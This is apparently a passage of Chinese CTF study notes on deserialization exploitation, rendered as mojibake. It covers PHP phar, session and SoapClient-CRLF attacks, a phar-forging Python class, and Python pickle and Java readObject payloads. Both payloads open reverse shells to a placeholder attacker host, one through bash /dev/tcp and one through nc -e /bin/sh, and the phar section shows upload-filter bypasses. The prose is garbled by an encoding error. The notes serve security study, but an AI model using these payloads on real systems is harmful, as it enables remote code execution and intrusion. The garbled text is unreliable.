  åœ¨ [php manual](https://www.php.net/manual/zh/var.configuration.php#ini.unserialize-callback-func) é‡Œé¢æœ‰ä¸€ä¸ªå¾ˆæœ‰è¶£çš„å˜é‡é…ç½®ï¼Œå¦‚æœåœ¨ååºåˆ—åŒ–çš„æ—¶å€™éœ€è¦å®ä¾‹åŒ–ä¸€ä¸ªæœªå®šä¹‰çš„ç±»ï¼Œå¯ä»¥è®¾ç½®å›è°ƒå‡½æ•°ä»¥ä¾›è°ƒç”¨ï¼Œæœ€å…³é”®çš„æ˜¯è¿™ä¸ªé…ç½®æ˜¯ PHP_IN_ALL çš„ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥é€šè¿‡ ini_set æ¥è®¾ç½®ã€‚

  > **æ³¨æ„**: **unserialize_callback_func æŒ‡ä»¤**
  >
  > å¦‚æœåœ¨ååºåˆ—åŒ–çš„æ—¶å€™éœ€è¦å®ä¾‹åŒ–ä¸€ä¸ªæœªå®šä¹‰ç±»ï¼Œåˆ™å¯ä»¥è®¾ç½®å›è°ƒå‡½æ•°ä»¥ä¾›è°ƒç”¨ï¼ˆä»¥å…å¾—åˆ°çš„æ˜¯ä¸å®Œæ•´çš„ object â€œ__PHP_Incomplete_Classâ€ï¼‰ã€‚å¯é€šè¿‡ php.iniã€[ini_set()](https://www.php.net/manual/zh/function.ini-set.php) æˆ– .htaccess å®šä¹‰â€˜unserialize_callback_funcâ€™ã€‚æ¯æ¬¡å®ä¾‹åŒ–ä¸€ä¸ªæœªå®šä¹‰ç±»æ—¶å®ƒéƒ½ä¼šè¢«è°ƒç”¨ã€‚è‹¥è¦ç¦æ­¢è¿™ä¸ªç‰¹æ€§ï¼Œåªéœ€ç½®ç©ºæ­¤è®¾å®šã€‚

  å¯ä»¥é€šè¿‡ **spl_autoload** æ¥è‡ªåŠ¨åŠ è½½æœªå®šä¹‰çš„ç±» settingsï¼Œä¼šé»˜è®¤åŠ è½½å½“å‰ç›®å½•ä¸‹ï¼Œä»¥settingsç±»åä¸ºæ–‡ä»¶åï¼Œphp æˆ–è€… inc ä¸ºåç¼€çš„æ–‡ä»¶ï¼Œè¿™æ ·å°±å’Œ settings.inc è”ç³»åˆ°äº†ä¸€èµ·ã€‚

  > **spl_autoload** â€” __autoload()å‡½æ•°çš„é»˜è®¤å®ç°
  >
  > spl_autoload ( string `$class_name` , string `$file_extensions` = ? ) : void
  >
  > file_extensions: åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œæœ¬å‡½æ•°å…ˆå°†ç±»åè½¬æ¢æˆå°å†™ï¼Œå†åœ¨å°å†™çš„ç±»åååŠ ä¸Š .inc æˆ– .php çš„æ‰©å±•åä½œä¸ºæ–‡ä»¶åï¼Œç„¶ååœ¨æ‰€æœ‰çš„åŒ…å«è·¯å¾„(include paths)ä¸­æ£€æŸ¥æ˜¯å¦å­˜åœ¨è¯¥æ–‡ä»¶ã€‚

**å¼•ç”¨ç»•è¿‡**

![image-20230210224630804](C:\Users\Treaveler\AppData\Roaming\Typora\typora-user-images\image-20230210224630804.png)

ä½¿ç”¨å¼•ç”¨ï¼Œå¯å®ç°$o->secret æ°¸è¿œç­‰äºenterï¼›ä¾¿å¯ç»•è¿‡$o->secret  === $o->enter

![image-20230210224546214](C:\Users\Treaveler\AppData\Roaming\Typora\typora-user-images\image-20230210224546214.png)



### ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸

PHP åœ¨ååºåˆ—åŒ–æ—¶ï¼Œåº•å±‚ä»£ç æ˜¯ä»¥ `;` ä½œä¸ºå­—æ®µçš„åˆ†éš”ï¼Œä»¥ `}` ä½œä¸ºç»“å°¾(å­—ç¬¦ä¸²é™¤å¤–)ï¼Œå¹¶ä¸”æ˜¯æ ¹æ®é•¿åº¦åˆ¤æ–­å†…å®¹çš„ã€‚

**1.å­—ç¬¦å¢å¤š**

ä¾‹å­ï¼š

å¤åˆ¶

```php
<?php
function filter($string){
    return str_replace('x','yy',$string);
}

$username = "peri0d";
$password = "aaaaa";
$user = array($username, $password);

var_dump(serialize($user));
echo '\n';

$r = filter(serialize($user));

var_dump($r);
echo '\n';

var_dump(unserialize($r));
```

1. æ­£å¸¸æƒ…å†µä¸‹çš„åºåˆ—åŒ–ç»“æœä¸º `a:2:{i:0;s:6:"peri0d";i:1;s:5:"aaaaa";}`ã€‚

2. é‚£å¦‚æœæŠŠ `username` æ¢æˆ `peri0dxxx` ï¼Œå…¶å¤„ç†åçš„åºåˆ—åŒ–ç»“æœä¸º

   `a:2:{i:0;s:9:"peri0dyyyyyy";i:1;s:5:"aaaaa";}` ï¼Œ

   è¿™ä¸ªæ—¶å€™è‚¯å®šä¼šååºåˆ—åŒ–å¤±è´¥ï¼Œå¯ä»¥çœ‹åˆ° `s:9:"peri0dyyyyyy"` æ¯”ä»¥å‰å¤šäº† 3 ä¸ªå­—ç¬¦ã€‚

3. å›åˆ°å‰é¢ï¼Œ `a:2:{i:0;s:6:"peri0d";i:1;s:5:"aaaaa";}`

   å®ƒåœ¨è¿›è¡Œä¿®æ”¹å¯†ç ä¹‹åå°±å˜ä¸º

   `a:2:{i:0;s:6:"peri0d";i:1;s:6:"123456";}i:1;s:5:"aaaaa";}`ã€‚

4. å¯ä»¥çœ‹åˆ°éœ€è¦æ·»åŠ çš„å­—ç¬¦ä¸² `";i:1;s:6:"123456";}` é•¿åº¦ä¸º `20`ã€‚

5. å‡è®¾è¦åœ¨ `peri0d` åé¢å¡«å…… `4` ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆå°±æ˜¯

   `s:30:'peri0dxxxx";i:1;s:6:"123456";}';`

   åœ¨ç»è¿‡å¤„ç†ä¹‹åå°±æ˜¯

   `s:30:'peri0dyyyyyyyy";i:1;s:6:"123456";}';`

   è¯»å– `30` ä¸ªå­—ç¬¦ä¸º `peri0dyyyyyyyy";i:1;s:6:"12345`ã€‚

6. è¿™å°±éœ€è¦ç»§ç»­å¢åŠ å¡«å……å­—ç¬¦ï¼Œåœ¨æœ‰ `20` ä¸ª `x` æ—¶ï¼Œå°±å®ç°äº†å¯†ç çš„ä¿®æ”¹ã€‚

   6+x+20=6+2xâ‡’x=206+x+20=6+2xâ‡’x=20

   ![20191112223227-402c9c0c-0559-1](https://lazzzaro.github.io/2020/05/15/web-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20191112223227-402c9c0c-0559-1.png)

7. å¯ä»¥çœ‹åˆ°ï¼Œè¿™å’Œ `username` å‰é¢çš„ `peri0d` æ˜¯**æ¯«æ— å…³ç³»**çš„ï¼Œ**åªå’Œåšæ›¿æ¢çš„å­—ç¬¦ä¸²æœ‰å…³**ã€‚

   **2.å­—ç¬¦å‡å°‘**

   



### pharååºåˆ—åŒ–

pharæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œåœ¨ä½¿ç”¨pharåè®®æ–‡ä»¶åŒ…å«æ—¶ï¼Œä¹Ÿæ˜¯å¯ä»¥ç›´æ¥è¯»å–zipæ–‡ä»¶çš„ã€‚ä½¿ç”¨phar://åè®®è¯»å–æ–‡ä»¶æ—¶ï¼Œæ–‡ä»¶ä¼šè¢«è§£ææˆpharå¯¹è±¡ï¼Œpharå¯¹è±¡å†…çš„ä»¥åºåˆ—åŒ–å½¢å¼å­˜å‚¨çš„ç”¨æˆ·è‡ªå®šä¹‰å…ƒæ•°æ®ï¼ˆmetadataï¼‰ä¿¡æ¯ä¼šè¢«ååºåˆ—åŒ–ã€‚è¿™å°±å¼•å‡ºäº†æˆ‘ä»¬æ”»å‡»æ‰‹æ³•æœ€æ ¸å¿ƒçš„æµç¨‹ã€‚

æµç¨‹ï¼šæ„é€ pharï¼ˆå…ƒæ•°æ®ä¸­å«æœ‰æ¶æ„åºåˆ—åŒ–å†…å®¹ï¼‰æ–‡ä»¶â€”>ä¸Šä¼ â€”>è§¦å‘ååºåˆ—åŒ–

æœ€åä¸€æ­¥æ˜¯å¯»æ‰¾è§¦å‘pharæ–‡ä»¶å…ƒæ•°æ®ååºåˆ—åŒ–ã€‚å…¶å®phpä¸­æœ‰ä¸€å¤§éƒ¨åˆ†çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°åœ¨é€šè¿‡phar://ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶éƒ½ä¼šå°†meta-dataè¿›è¡Œååºåˆ—åŒ–ã€‚

**åˆ©ç”¨æ¡ä»¶**

- pharæ–‡ä»¶è¦èƒ½å¤Ÿä¸Šä¼ åˆ°æœåŠ¡å™¨ç«¯ã€‚èƒ½è§¦å‘çš„æ–‡ä»¶æ“ä½œå‡½æ•°ï¼š

  includeã€file_get_contentsã€file_put_contentsã€copyã€fileã€file_existsã€is_executableã€is_fileã€is_dirã€is_linkã€is_writableã€filepermsã€fileinodeã€filesizeã€fileownerã€filegroupã€fileatimeã€filemtimeã€filectimeã€filetypeã€getimagesizeã€exif_read_dataã€statã€lstatã€touchã€md5_file

- è¦æœ‰å¯ç”¨çš„é­”æœ¯æ–¹æ³•ä½œä¸ºâ€œè·³æ¿â€ã€‚

- æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œä¸”`:`ã€`/`ã€`phar`ç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤ã€‚

**ç”Ÿæˆpharæ–‡ä»¶**

é¦–å…ˆå¾—ç”Ÿæˆä¸€ä¸ªå«æœ‰åºåˆ—åŒ–metadataçš„pharæ–‡ä»¶ã€‚phpæä¾›ä¸€ä¸ªç±»å…è®¸æˆ‘ä»¬å¤„ç†pharæ–‡ä»¶ç›¸å…³æ“ä½œã€‚æ³¨æ„è¦è®¾ç½®php.iniä¸­**phar.readonly=Off**ã€‚

å¤åˆ¶

```
<?php
class User {
    Public $nameï¼›
}

@unlink("phar.phar");
$phar = new Phar("phar.phar"); //åç¼€åå¿…é¡»ä¸ºpharï¼Œç”Ÿæˆåå¯ä»¥éšæ„ä¿®æ”¹
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //è®¾ç½®stub
$o = new User();   
$o->name = 'JrXnm';
$phar->setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest
$phar->addFromString("test.txt", "test"); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶
//ç­¾åè‡ªåŠ¨è®¡ç®—
$phar->stopBuffering();
```

taråŒ…è£…ï¼š

å¤åˆ¶

```
<?php
class User {
    Public $nameï¼›
}

$o = new User();   
$o->name = 'JrXnm';
@unlink("phar.tar");
@system('rm -r .phar');
@system('mkdir .phar');
file_put_contents('.phar/.metadata',serialize($o));
system('tar -cf phar.tar .phar/*');

// phar://./phar.tar
// phar:///var/www/html/uploads/phar.tar
```

zipåŒ…è£…ï¼š

å¤åˆ¶

```
<?php
class User {
    Public $nameï¼›
}

$o = new User();   
$o->name = 'JrXnm';
$d = serialize($o);
if(file_exists('phar.zip')) {
    @unlink("phar.zip");
}
$zip = new ZipArchive;
$res = $zip->open('phar.zip', ZipArchive::CREATE);
$zip->addFromString('test.txt', 'file content goes here');
$zip->setArchiveComment($d);
$zip->close();

// phar://./phar.zip
// phar:///var/www/html/uploads/phar.zip
```

**ä¸Šä¼ åˆ°æœåŠ¡å™¨**

pharæ–‡ä»¶æ˜¯å¾ˆå®¹æ˜“ç»•è¿‡ä¸Šä¼ é™åˆ¶çš„ï¼Œé¦–å…ˆå®ƒçš„åç¼€æ˜¯ä¸é™åˆ¶çš„ï¼Œæ”¹æˆä»€ä¹ˆphar://åè®®éƒ½å¯ä»¥è§£æã€‚

å‰é¢è¿™ä¸ªæ ‡å¿—çš„æ ¼å¼ä¸º`xxx<?php xxx; __HALT_COMPILER();?>` å‰é¢å†…å®¹ä¸é™ï¼Œè¿™æ ·å¯ä»¥åœ¨å‰é¢æ·»åŠ æ³¨å…¥`GIF98a`è¿™æ ·çš„æ–‡ä»¶å¤´ç»•è¿‡ä¸Šä¼ é™åˆ¶ã€‚

**ååºåˆ—åŒ–æ‰§è¡Œ**

ç›´æ¥æ‰§è¡Œæµ‹è¯•çš„é‚£ä»½ä»£ç ï¼Œphar://åè®®åœ¨file_get_contentså‡½æ•°ä¸­è§£æpharæ–‡ä»¶ï¼Œå°†å…ƒæ•°æ®ååºåˆ—åŒ–æ‰§è¡Œé­”æ³•å‡½æ•°ã€‚

**ç»•è¿‡**

- **phar://ä¸èƒ½å‡ºç°åœ¨é¦–éƒ¨**

  å¤åˆ¶

  ```
  compress.zlib://phar://
  compress.bzip2://phar://
  php://filter/resource=phar://
  ```

- **å…³é”®å­—**

  ç»•è¿‡å¦‚ `HALT_COMPILER`ï¼Œä½¿ç”¨ `gzip` å‘½ä»¤å¤„ç†pharæ–‡ä»¶ï¼š

  `gzip phar.jpg`

  å‚è€ƒï¼š[ä»ä¸€é“é¢˜å†çœ‹pharçš„åˆ©ç”¨](https://www.anquanke.com/post/id/240007#h2-5)

- **ä¿®æ”¹pharæ–‡ä»¶**

  æ”¹pharæ–‡ä»¶å†…å®¹ï¼Œå› pharæ–‡ä»¶æ˜¯æœ‰æ£€éªŒå’Œçš„ï¼Œæ‰€ä»¥ç›´æ¥æ”¹pharæ–‡ä»¶å†…å®¹ä¸å¯è¡Œã€‚

  å‚è€ƒï¼š[æ€»ç»“ - ctfä¸­phpçš„phar(ä¸€)](https://morblog.cc/posts/2586386993/)

  ä¿®å¤ç­¾åæ•°æ®ï¼š

  å¤åˆ¶

  ```
  from hashlib import sha1
  f = open('./ph1.phar', 'rb').read() # ä¿®æ”¹å†…å®¹åçš„pharæ–‡ä»¶
  s = f[:-28] # è·å–è¦ç­¾åçš„æ•°æ®
  h = f[-8:] # è·å–ç­¾åç±»å‹ä»¥åŠGBMBæ ‡è¯†
  newf = s+sha1(s).digest()+h # æ•°æ® + ç­¾å + ç±»å‹ + GBMB
  open('ph2.phar', 'wb').write(newf) # å†™å…¥æ–°æ–‡ä»¶
  ```

  æ„é€ pharç»“æ„ï¼š

  å¤åˆ¶

  ```
  from zlib import crc32
  from struct import pack
  from time import time
  from hashlib import md5, sha1, sha256, sha512
  
  
  class PHAR:
      # ä¸€äº›å¸¸é‡
      STUB = b"__HALT_COMPILER(); ?>"
      GBMB = b"GBMB"
      MD5 = b"\x01\x00\x00\x00"
      SHA1 = b"\x02\x00\x00\x00"
      SHA256 = b"\x03\x00\x00\x00"
      SHA512 = b"\x04\x00\x00\x00"
  
      def __init__(self,
                   prefix: str,
                   manifestData: dict,
                   filesData: list,
                   signatureType: MD5
                   ):
          self.prefix = prefix.encode()
          self.manifestData = manifestData
          self.filesData = filesData
          self.signatureType = signatureType
  
      def parse(self):
  
          # æ£€æŸ¥æ¸…å•çš„å‚æ•°
          if any(self.manifestData.get(each) is None for each in ["loc", "metaData"]):
              return False
          # è‡³å°‘è¦å½’æ¡£ä¸€ä¸ªæ–‡ä»¶
          if len(self.filesData) == 0:
              return False
          # éå†æ£€æŸ¥æ–‡ä»¶çš„å‚æ•°
          for file in self.filesData:
              if any(file.get(each) is None for each in ["fileName", "fileContent", "loc", "metaData"]):
                  return False
  
          # å°†å­—ç¬¦ä¸²è½¬æ¢å­—èŠ‚æµ
          self.manifestData["metaData"] = self.manifestData["metaData"].encode()
          for file in self.filesData:
              for key, value in file.items():
                  if key in ["fileName", "fileContent", "metaData"]:
                      file[key] = value.encode()
  
          return True
  
      def generate(self):
  
          # æ£€æŸ¥å‚æ•°
          if not self.parse():
              return b""
  
          phar = b""
          # stub
          stub = self.stub()
          # manifest
          manifest = self.manifest()
          files = self.file()
          # content
          contents = self.content()
          # è®¡ç®—æ€»é•¿åº¦
          manifest = pack("I", len(manifest + files + contents)) + manifest[4:]
          # signature
          signature = self.signature(stub + manifest + files + contents)
          # é‡æ–°æ‹¼æ¥
          phar += stub + manifest + files + contents + signature
  
          return phar
  
      def stub(self):
          return self.prefix + self.STUB + b"\r\n"
  
      def manifest(self):
  
          # å½’æ¡£æ–‡ä»¶æ•°é‡
          manifest = pack("I", len(self.filesData))
          # ç‰ˆæœ¬
          manifest += b"\x11\x00"
          # æ ‡è¯†
          manifest += b"\x00\x00\x01\x00"
          # åˆ«åé•¿åº¦
          manifest += b"\x00\x00\x00\x00"
  
          # å¦‚æœå°†åºåˆ—åŒ–å†…å®¹å­˜å‚¨äºæ­¤
          if self.manifestData["loc"]:
              # metadataé•¿åº¦
              manifest += pack("I", len(self.manifestData["metaData"]))
              # metadataå†…å®¹
              manifest += self.manifestData["metaData"]
          else:
              manifest += pack("I", 0)
  
          # è¡¥è¶³é•¿åº¦
          manifest = pack("I", 0) + manifest
  
          return manifest
  
      def file(self):
  
          files = b""
  
          # éå†å½’æ¡£çš„æ–‡ä»¶
          for file in self.filesData:
              # æ–‡ä»¶åé•¿åº¦
              files += pack("I", len(file["fileName"]))
              # æ–‡ä»¶å
              files += file["fileName"]
              # æœªå‹ç¼©å¤§å°
              files += pack("I", len(file["fileContent"]))
              # æ—¶é—´æˆ³
              files += pack("I", int(time()))
              # å‹ç¼©åå¤§å°
              files += pack("I", len(file["fileContent"]))
              # CRC32æ ¡éªŒ
              files += pack("I", crc32(file["fileContent"]))
              # æ–‡ä»¶æƒé™
              files += pack("I", 0o666)
  
              # å¦‚æœå°†åºåˆ—åŒ–å†…å®¹å­˜å‚¨äºæ­¤
              if file["loc"]:
                  # metadataé•¿åº¦
                  files += pack("I", len(file["metaData"]))
                  # metadataå†…å®¹
                  files += file["metaData"]
              else:
                  files += pack("I", 0)
  
          return files
  
      def content(self):
  
          contents = b""
  
          # éå†æ‰€æœ‰å½’æ¡£æ–‡ä»¶
          for file in self.filesData:
              contents += file["fileContent"]
  
          return contents
  
      def signature(self, content):
  
          signature = b""
  
          # ç­¾åå†…å®¹
          if self.signatureType == self.MD5:
              signature = md5(content).digest()
          if self.signatureType == self.SHA1:
              signature = sha1(content).digest()
          if self.signatureType == self.SHA256:
              signature = sha256(content).digest()
          if self.signatureType == self.SHA512:
              signature = sha512(content).digest()
          # ç­¾åæ ‡å¿—
          signature += self.signatureType
          # GBMBæ ‡å¿—
          signature += self.GBMB
  
          return signature
  
  
  if __name__ == '__main__':
      pharData = {
          "prefix": "123",
          "manifestData": {
              "loc": True,
              "metaData": """O:1:"e":1:{s:1:"a";s:4:"text";}""",
          },
          "filesData": [
              {
                  "fileName": "e.txt",
                  "fileContent": "dsadawada",
                  "loc": True,
                  "metaData": """O:1:"e":1:{s:1:"a";s:4:"text";}""",
              },
              {
                  "fileName": "c.txt",
                  "fileContent": "123",
                  "loc": True,
                  "metaData": """O:1:"e":1:{s:1:"a";s:4:"text";}""",
              },
          ],
          "signatureType": PHAR.SHA1,
      }
      p = PHAR(**pharData).generate()
      with open("a.phar", "wb") as f:
          f.write(p)
  ```



### PHP sessionååºåˆ—åŒ–

PHPä¸­çš„sessionä¸­çš„å†…å®¹å¹¶ä¸æ˜¯æ”¾åœ¨å†…å­˜ä¸­çš„ï¼Œè€Œæ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼æ¥å­˜å‚¨çš„ï¼Œå­˜å‚¨æ–¹å¼å°±æ˜¯ç”±é…ç½®é¡¹ **session.save_handler** æ¥è¿›è¡Œç¡®å®šçš„ï¼Œé»˜è®¤æ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼å­˜å‚¨ã€‚å­˜å‚¨çš„æ–‡ä»¶æ˜¯ä»¥sess_[sessionid]æ¥è¿›è¡Œå‘½åçš„ã€‚

æœ‰ä¸‰ç§æ–¹å¼ï¼š

- é»˜è®¤ä½¿ç”¨phpï¼šé”®å|é”®å€¼ï¼ˆç»è¿‡åºåˆ—åŒ–å‡½æ•°å¤„ç†çš„å€¼ï¼‰

  `name|s:6:"1FonlY";`

- **php_serialize**ï¼šç»è¿‡åºåˆ—åŒ–å‡½æ•°å¤„ç†çš„å€¼

  `a:1:{s:4:"name";s:6:"1FonlY";}`

- **php_binary**ï¼šé”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦ + é”®å + ç»è¿‡åºåˆ—åŒ–å‡½æ•°å¤„ç†çš„å€¼

  `names:6:"1FonlY";`

  ä¸å¯æ˜¾çš„ä¸º`EOT` ,`name`çš„é•¿åº¦ä¸º`4` 4åœ¨ASCII è¡¨ä¸­å°±æ˜¯ EOT

**å½“åºåˆ—åŒ–çš„å¼•æ“å’Œååºåˆ—åŒ–çš„å¼•æ“ä¸ä¸€è‡´æ—¶(å†™å…¥å’Œè¯»å–sessionçš„æ ¼å¼ä¸ä¸€æ ·ï¼‰ï¼Œå°±å¯ä»¥åˆ©ç”¨å¼•æ“ä¹‹é—´çš„å·®å¼‚äº§ç”Ÿåºåˆ—åŒ–æ³¨å…¥æ¼æ´ã€‚**

æ¯”å¦‚è¿™é‡Œå…ˆå®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼Œç„¶åå°†å…¶åºåˆ—åŒ–ä¸º `O:7:"_1FonlY":1:{s:3:"cmd";N;}`ï¼Œ

å¦‚æœä¼ å…¥ `|O:7:"_1FonlY":1:{s:3:"cmd";N;}`ï¼Œåœ¨ä½¿ç”¨`php_serialize` å¼•æ“çš„æ—¶å€™ï¼Œ

åºåˆ—åŒ–åçš„session æ–‡ä»¶æ˜¯è¿™æ ·çš„ `a:1:{s:4:"name";s:31:"|O:7:"_1FonlY":1:{s:3:"cmd";N;}";}`ï¼Œ

è¿™æ—¶ï¼Œå°†`a:1:{s:4:"name";s:31:"` å½“åšé”®åï¼Œ`O:7:"_1FonlY":1:{s:3:"cmd";N;}` å½“åšé”®å€¼ï¼Œå°†é”®å€¼è¿›è¡Œååºåˆ—åŒ–è¾“å‡ºï¼Œè¿™æ—¶å°±é€ æˆäº†åºåˆ—åŒ–æ³¨å…¥æ”»å‡»ã€‚



### Soapååºåˆ—åŒ–

`SOAP` : `Simple Object Access Protocol`ç®€å•å¯¹è±¡è®¿é—®åè®®ã€‚

é‡‡ç”¨HTTPä½œä¸ºåº•å±‚é€šè®¯åè®®ï¼ŒXMLä½œä¸ºæ•°æ®ä¼ é€çš„æ ¼å¼ï¼Œæ­£å¸¸æƒ…å†µä¸‹çš„`SoapClient`ç±»ï¼Œè°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„å‡½æ•°ï¼Œä¼šå»è°ƒç”¨`__call`æ–¹æ³•ã€‚

**CRLFæ¼æ´**

`SOAPAction`å¤„å¯æ§ï¼Œå¯ä»¥æŠŠ`\x0d\x0a`æ³¨å…¥åˆ°`SOAPAction`ï¼ŒPOSTè¯·æ±‚çš„headerå°±å¯ä»¥è¢«æ§åˆ¶ã€‚

ä½†`Content-Type`åœ¨`SOAPAction`çš„ä¸Šé¢ï¼Œå°±æ— æ³•æ§åˆ¶`Content-Type`ï¼Œä¹Ÿå°±ä¸èƒ½æ§åˆ¶POSTçš„æ•°æ®ã€‚

åœ¨headeré‡Œ`User-Agent`åœ¨`Content-Type`å‰é¢ï¼Œ`user_agent`åŒæ ·å¯ä»¥æ³¨å…¥`CRLF`ï¼Œæ§åˆ¶`Content-Type`çš„å€¼ã€‚

å¤åˆ¶

```
<?php
$target = 'http://127.0.0.1:5555/path';
$post_string = 'data=something';
$headers = array(
    'X-Forwarded-For: 127.0.0.1',
    'Cookie: PHPSESSID=my_session'
    );
$b = new SoapClient(null,array('location' => $target,'user_agent'=>'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'=> "aaab"));

$aaa = serialize($b);
$aaa = str_replace('^^',"\r\n",$aaa);
//$aaa = str_replace('&','&',$aaa);
echo $aaa;
//echo urlencode($aaa);

//$c = unserialize($aaa);
//$c->not_exists_function();
?>
```

å¦‚ä¸Šï¼Œä½¿ç”¨SoapClientååºåˆ—åŒ–+CRLF**å¯ä»¥ç”Ÿæˆä»»æ„POSTè¯·æ±‚**ã€‚

**`Deserialization + __call + SoapClient + CRLF = SSRF`**



### pythonååºåˆ—åŒ–

ä¸PHPç±»ä¼¼ï¼Œpythonä¹Ÿæœ‰åºåˆ—åŒ–åŠŸèƒ½ä»¥é•¿æœŸå‚¨å­˜å†…å­˜ä¸­çš„æ•°æ®ã€‚pickleæ˜¯pythonä¸‹çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–åŒ…ã€‚

pythonæœ‰å¦ä¸€ä¸ªæ›´åŸå§‹çš„åºåˆ—åŒ–åŒ…marshalï¼Œç°åœ¨å¼€å‘æ—¶ä¸€èˆ¬ä½¿ç”¨pickleã€‚

ä¸jsonç›¸æ¯”ï¼Œpickleä»¥äºŒè¿›åˆ¶å‚¨å­˜ï¼Œä¸æ˜“äººå·¥é˜…è¯»ï¼›jsonå¯ä»¥è·¨è¯­è¨€ï¼Œè€Œpickleæ˜¯Pythonä¸“ç”¨çš„ï¼›pickleèƒ½è¡¨ç¤ºpythonå‡ ä¹æ‰€æœ‰çš„ç±»å‹ï¼ˆåŒ…æ‹¬è‡ªå®šä¹‰ç±»å‹ï¼‰ï¼Œjsonåªèƒ½è¡¨ç¤ºä¸€éƒ¨åˆ†å†…ç½®ç±»å‹ä¸”ä¸èƒ½è¡¨ç¤ºè‡ªå®šä¹‰ç±»å‹ã€‚

pickleå®é™…ä¸Šå¯ä»¥çœ‹ä½œä¸€ç§**ç‹¬ç«‹çš„è¯­è¨€**ï¼Œé€šè¿‡å¯¹opcodeçš„æ›´æ”¹ç¼–å†™å¯ä»¥æ‰§è¡Œpythonä»£ç ã€è¦†ç›–å˜é‡ç­‰æ“ä½œã€‚ç›´æ¥ç¼–å†™çš„opcodeçµæ´»æ€§æ¯”ä½¿ç”¨pickleåºåˆ—åŒ–ç”Ÿæˆçš„ä»£ç æ›´é«˜ï¼Œæœ‰çš„ä»£ç ä¸èƒ½é€šè¿‡pickleåºåˆ—åŒ–å¾—åˆ°ï¼ˆpickleè§£æèƒ½åŠ›å¤§äºpickleç”Ÿæˆèƒ½åŠ›ï¼‰ã€‚

å¤åˆ¶

```
# poc
import pickle
import base64
class A(object):
    def __reduce__(self):
        return (eval,("__import__('os').system('bash -c \"bash -i >& /dev/tcp/[IP]/[Port] 0>&1\"')",))
poc = A()
result = pickle.dumps(poc)
result = base64.b64encode(result)
print(result)
```

å‚è€ƒï¼š

[Python-Pickleååºåˆ—åŒ–å®‰å…¨é—®é¢˜](https://www.f4de.ink/pages/20ac5e/#pickleï¼špythonçš„åºåˆ—åŒ–åº“)

[pickleååºåˆ—åŒ–åˆæ¢](https://xz.aliyun.com/t/7436)

[Code-Breakingä¸­çš„ä¸¤ä¸ªPythonæ²™ç®±](https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html)

[pickleååºåˆ—åŒ–â€”é«˜æ ¡æŠ—â€œç–«â€ç½‘ç»œå®‰å…¨åˆ†äº«èµ›](https://www.cnblogs.com/DEADF1SH-CAT/p/12465346.html)

[ä»é›¶å¼€å§‹pythonååºåˆ—åŒ–æ”»å‡»ï¼špickleåŸç†è§£æ & ä¸ç”¨reduceçš„RCEå§¿åŠ¿](https://zhuanlan.zhihu.com/p/89132768)



### Javaååºåˆ—åŒ–

Javaåºåˆ—åŒ–æ˜¯æŒ‡æŠŠJavaå¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—çš„è¿‡ç¨‹ï¼Œ`ObjectOutputStream` ç±»çš„ `writeObject()` æ–¹æ³•å¯ä»¥å®ç°åºåˆ—åŒ–ã€‚

Javaååºåˆ—åŒ–æ˜¯æŒ‡æŠŠå­—èŠ‚åºåˆ—æ¢å¤ä¸ºJavaå¯¹è±¡çš„è¿‡ç¨‹ï¼Œ`ObjectOutputStream` ç±»çš„ `readObject()` æ–¹æ³•ç”¨äºååºåˆ—åŒ–ã€‚

ä¸€ä¸ªç±»è¦èƒ½ååºåˆ—åŒ–å¿…é¡»æ»¡è¶³ä¸‹é¢2ä¸ªæ¡ä»¶ï¼š

1. è¯¥ç±»å¿…é¡»å®ç° `java.io.Serializable` æ¥å£ï¼›
2. è¯¥ç±»çš„æ‰€æœ‰å±æ€§å¿…é¡»æ˜¯å¯åºåˆ—åŒ–çš„ã€‚å¦‚æœæœ‰ä¸€ä¸ªå±æ€§ä¸æ˜¯å¯åºåˆ—åŒ–çš„ï¼Œåˆ™è¯¥å±æ€§å¿…é¡»æ³¨æ˜æ˜¯çŸ­æš‚çš„ã€‚

å¤åˆ¶

```
public class User implements Serializable {
    private String username;
    public User(String username) {
        this.username = username;
    }
    public String getName(){
        return this.username;
    }
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        Runtime.getRuntime().exec(this.username);
    }
}

package com.ctfshow.entity;

public class UserPayload {
    public static void main(String[] args) throws Exception {
        String userDataPost = null;
        User user = new User("nc IP Port -e /bin/sh");
        try {
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream os = new ObjectOutputStream(byteArrayOutputStream);
            os.writeObject(user);
            os.close();
            byte[] userData = byteArrayOutputStream.toByteArray();
            userDataPost = new String(Base64.getEncoder().encode(userData));
            System.out.println(userDataPost);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        
    }
}
```

**ç»•è¿‡**

- readUnshared()

